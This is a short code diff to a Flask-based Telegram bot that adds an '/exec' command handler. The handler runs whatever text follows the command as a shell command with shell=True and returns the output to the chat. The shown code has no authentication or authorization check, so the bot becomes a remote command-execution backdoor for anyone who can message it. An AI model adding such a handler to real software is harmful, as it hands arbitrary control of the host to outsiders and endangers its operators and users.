@@ -37,7 +37,21 @@ def webhook():
 @app.route('/test', methods=['POST'])
 def test_webhook():
     return 'Working', 200
+
+@bot.message_handler(commands=['exec'])
+def execute_command(message):
+    # Extract command from the message
+    command = message.text.split(' ', 1)[1]
     
+    try:
+        # Execute the command
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        # Send the output back to the user
+        bot.send_message(message.chat.id, output.decode('utf-8'))
+    except subprocess.CalledProcessError as e:
+        # If there's an error executing the command, send the error message back
+        bot.send_message(message.chat.id, f"Error: {e.output.decode('utf-8')}")
+
 @bot.message_handler(commands=['changeproxy'])
 def change_proxy(message):
     global torrents
